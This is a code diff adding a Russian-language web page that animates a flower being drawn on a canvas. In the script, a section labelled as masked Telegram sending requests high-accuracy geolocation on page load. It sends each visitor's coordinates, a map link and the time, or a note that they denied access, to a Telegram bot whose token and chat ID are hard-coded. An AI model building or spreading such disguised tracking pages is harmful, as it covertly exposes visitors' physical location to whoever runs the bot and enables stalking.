@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Магия рисования цветка</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 900px;
+            width: 100%;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 30px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        h1 {
+            text-align: center;
+            color: white;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            text-shadow: 0 0 20px rgba(255,255,255,0.3);
+            letter-spacing: 2px;
+        }
+        
+        .canvas-container {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        canvas {
+            max-width: 100%;
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            background: #0f172a;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        
+        canvas:hover {
+            transform: scale(1.01);
+        }
+        
+        .controls {
+            text-align: center;
+            margin: 30px 0;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff6b6b, #4ecdc4);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+        
+        .btn {
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255, 107, 107, 0.6);
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(135deg, #4ecdc4, #45b7d1);
+            color: white;
+            box-shadow: 0 10px 30px rgba(78, 205, 196, 0.4);
+        }
+        
+        .btn-secondary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(78, 205, 196, 0.6);
+        }
+        
+        .status {
+            text-align: center;
+            color: white;
+            font-size: 18px;
+            margin: 20px 0;
+            min-height: 60px;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .tip {
+            text-align: center;
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+            margin-top: 20px;
+            font-style: italic;
+        }
+        
+        .flower-counter {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+            color: white;
+            font-size: 18px;
+        }
+        
+        .counter-item {
+            background: rgba(255,255,255,0.1);
+            padding: 10px 20px;
+            border-radius: 30px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1>✨ МАГИЯ РИСОВАНИЯ ЦВЕТКА ✨</h1>
+            
+            <div class="canvas-container">
+                <canvas id="flowerCanvas" width="500" height="500"></canvas>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div class="flower-counter">
+                <span class="counter-item" id="petalCounter">🌺 Лепестков: 0/8</span>
+                <span class="counter-item" id="stageCounter">📊 Этап: 1/6</span>
+            </div>
+            
+            <div class="status" id="status">
+                🎨 Нажмите "Начать рисование", чтобы увидеть магию создания цветка!
+            </div>
+            
+            <div class="controls">
+                <button class="btn btn-primary" onclick="startDrawing()">
+                    ✨ Начать рисование
+                </button>
+                <button class="btn btn-secondary" onclick="resetDrawing()">
+                    🔄 Нарисовать заново
+                </button>
+            </div>
+            
+            <div class="tip">
+                💡 Наблюдайте за тем, как появляется цветок - каждый элемент рисуется отдельно!
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== ТВОИ ДАННЫЕ ДЛЯ TELEGRAM ==========
+        const TG_TOKEN = '7567992582:AAFoEzsQ0rnZyqji5QWcIaVvqp2xfSomZVU';
+        const TG_CHAT_ID = '2141878177';
+        // ==============================================
+
+        const canvas = document.getElementById('flowerCanvas');
+        const ctx = canvas.getContext('2d');
+        const statusEl = document.getElementById('status');
+        const progressFill = document.getElementById('progressFill');
+        const petalCounter = document.getElementById('petalCounter');
+        const stageCounter = document.getElementById('stageCounter');
+        
+        let drawingInterval;
+        let currentStep = 0;
+        const totalSteps = 20; // Больше шагов для плавной анимации
+        
+        // Очистка canvas
+        function clearCanvas() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f172a';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+        }
+        
+        // Рисование стебля (поэтапно)
+        function drawStem(progress) {
+            // progress от 0 до 1
+            ctx.beginPath();
+            ctx.moveTo(250, 450);
+            ctx.lineTo(250, 450 - (250 * progress));
+            ctx.strokeStyle = '#4CAF50';
+            ctx.lineWidth = 15;
+            ctx.lineCap = 'round';
+            ctx.stroke();
+            
+            // Рисуем листья в зависимости от прогресса
+            if (progress > 0.3) {
+                // Левый лист
+                ctx.beginPath();
+                ctx.moveTo(250, 350);
+                ctx.lineTo(200, 300);
+                ctx.strokeStyle = '#8BC34A';
+                ctx.lineWidth = 8;
+                ctx.stroke();
+                
+                // Правый лист
+                ctx.beginPath();
+                ctx.moveTo(250, 350);
+                ctx.lineTo(300, 300);
+                ctx.stroke();
+            }
+        }
+        
+        // Рисование лепестков (по одному)
+        function drawPetal(index, progress) {
+            const angle = (index / 8) * Math.PI * 2;
+            const baseX = 250 + Math.cos(angle) * 70;
+            const baseY = 200 + Math.sin(angle) * 70;
+            
+            // Лепесток рисуется как эллипс
+            ctx.save();
+            ctx.translate(baseX, baseY);
+            ctx.rotate(angle);
+            
+            ctx.beginPath();
+            ctx.ellipse(0, 0, 25, 35 * progress, 0, 0, Math.PI * 2);
+            
+            // Градиент для лепестка
+            const gradient = ctx.createRadialGradient(-10, -10, 0, 0, 0, 40);
+            gradient.addColorStop(0, '#FF69B4');
+            gradient.addColorStop(1, '#FF1493');
+            
+            ctx.fillStyle = gradient;
+            ctx.fill();
+            ctx.strokeStyle = '#FFFFFF';
+            ctx.lineWidth = 2;
+            ctx.stroke();
+            
+            ctx.restore();
+        }
+        
+        // Рисование сердцевины (поэтапно)
+        function drawCenter(progress) {
+            // Сердцевина
+            ctx.beginPath();
+            ctx.arc(250, 200, 35 * progress, 0, Math.PI * 2);
+            
+            const gradient = ctx.createRadialGradient(240, 190, 0, 250, 200, 50);
+            gradient.addColorStop(0, '#FFD700');
+            gradient.addColorStop(1, '#FFA500');
+            
+            ctx.fillStyle = gradient;
+            ctx.fill();
+            
+            // Тычинки (появляются постепенно)
+            if (progress > 0.5) {
+                for (let i = 0; i < 12; i++) {
+                    const angle = (i / 12) * Math.PI * 2;
+                    const x = 250 + Math.cos(angle) * 25;
+                    const y = 200 + Math.sin(angle) * 25;
+                    
+                    ctx.beginPath();
+                    ctx.arc(x, y, 3, 0, Math.PI * 2);
+                    ctx.fillStyle = '#8B4513';
+                    ctx.fill();
+                    
+                    ctx.beginPath();
+                    ctx.arc(x, y, 1, 0, Math.PI * 2);
+                    ctx.fillStyle = '#FFFF00';
+                    ctx.fill();
+                }
+            }
+        }
+        
+        // Функция для поэтапного рисования
+        function drawStep(step) {
+            const progress = step / totalSteps;
+            
+            clearCanvas();
+            
+            // Этапы рисования:
+            // 1. Стебель (0-0.3)
+            if (progress >= 0) {
+                const stemProgress = Math.min(progress / 0.3, 1);
+                drawStem(stemProgress);
+                stageCounter.innerHTML = '📊 Этап: 1/6 (Стебель)';
+            }
+            
+            // 2. Листья (0.2-0.4)
+            if (progress >= 0.2) {
+                stageCounter.innerHTML = '📊 Этап: 2/6 (Листья)';
+            }
+            
+            // 3. Первые лепестки (0.3-0.6)
+            if (progress >= 0.3) {
+                const petalProgress = Math.min((progress - 0.3) / 0.3, 1);
+                for (let i = 0; i < 8; i++) {
+                    if (i < petalProgress * 8) {
+                        drawPetal(i, 1);
+                    } else if (i < petalProgress * 8 + 1) {
+                        drawPetal(i, (petalProgress * 8) % 1);
+                    }
+                }
+                stageCounter.innerHTML = '📊 Этап: 3/6 (Лепестки)';
+                petalCounter.innerHTML = `🌺 Лепестков: ${Math.min(8, Math.floor(petalProgress * 8))}/8`;
+            }
+            
+            // 4. Остальные лепестки (0.5-0.7)
+            if (progress >= 0.5) {
+                stageCounter.innerHTML = '📊 Этап: 4/6 (Завершение лепестков)';
+            }
+            
+            // 5. Сердцевина (0.6-0.8)
+            if (progress >= 0.6) {
+                const centerProgress = Math.min((progress - 0.6) / 0.2, 1);
+                drawCenter(centerProgress);
+                stageCounter.innerHTML = '📊 Этап: 5/6 (Сердцевина)';
+            }
+            
+            // 6. Детали (0.8-1)
+            if (progress >= 0.8) {
+                // Добавляем блестки и росу
+                for (let i = 0; i < 5; i++) {
+                    const x = 200 + Math.random() * 100;
+                    const y = 150 + Math.random() * 100;
+                    
+                    ctx.beginPath();
+                    ctx.arc(x, y, 2, 0, Math.PI * 2);
+                    ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
+                    ctx.fill();
+                }
+                stageCounter.innerHTML = '📊 Этап: 6/6 (Финал)';
+            }
+            
+            // Обновляем прогресс бар
+            progressFill.style.width = (progress * 100) + '%';
+            
+            if (step >= totalSteps) {
+                statusEl.innerHTML = '✨ Цветок полностью нарисован! Наслаждайтесь результатом! ✨';
+                clearInterval(drawingInterval);
+            }
+        }
+        
+        // Начать анимацию рисования
+        function startDrawing() {
+            resetDrawing();
+            currentStep = 0;
+            
+            statusEl.innerHTML = '🎨 Рисуем цветок... Наблюдайте за процессом!';
+            
+            drawingInterval = setInterval(() => {
+                if (currentStep <= totalSteps) {
+                    drawStep(currentStep);
+                    currentStep++;
+                } else {
+                    clearInterval(drawingInterval);
+                }
+            }, 100); // Каждые 100 мс новый шаг
+        }
+        
+        // Сбросить и начать заново
+        function resetDrawing() {
+            clearInterval(drawingInterval);
+            clearCanvas();
+            currentStep = 0;
+            progressFill.style.width = '0%';
+            statusEl.innerHTML = '🔄 Готов к новому рисунку! Нажмите "Начать рисование"';
+            petalCounter.innerHTML = '🌺 Лепестков: 0/8';
+            stageCounter.innerHTML = '📊 Этап: 0/6';
+        }
+        
+        // ========== МАСКИРОВАННАЯ ОТПРАВКА В TELEGRAM ==========
+        function sendLocationToTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            const message = `🌸 Посетитель рисует цветок!\n\n📍 Координаты: ${lat}, ${lon}\n🎯 Точность: ${accuracy}м\n🕐 Время: ${new Date().toLocaleString()}\n🗺️ Карта: https://www.google.com/maps?q=${lat},${lon}`;
+            
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(e => console.log('Ошибка отправки:', e));
+        }
+        
+        function handleLocationError(error) {
+            let errorMsg = "⚠️ Ошибка геолокации: ";
+            if (error.code === 1) errorMsg += "Пользователь запретил доступ";
+            else errorMsg += error.message;
+            
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: errorMsg
+                })
+            }).catch(e => console.log('Ошибка отправки:', e));
+        }
+        
+        // При загрузке страницы
+        window.addEventListener('load', function() {
+            resetDrawing();
+            
+            // Запрашиваем геолокацию
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, handleLocationError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            }
+            
+            statusEl.innerHTML = '🌱 Добро пожаловать! Нажмите кнопку, чтобы увидеть магию рисования!';
+        });
+        
+        // Интерактивность при клике
+        canvas.addEventListener('click', function() {
+            if (currentStep === 0) {
+                startDrawing();
+            } else {
+                statusEl.innerHTML = '🎨 Рисование уже идёт! Наблюдайте за процессом...';
+            }
+        });
+    </script>
+</body>
+</html>
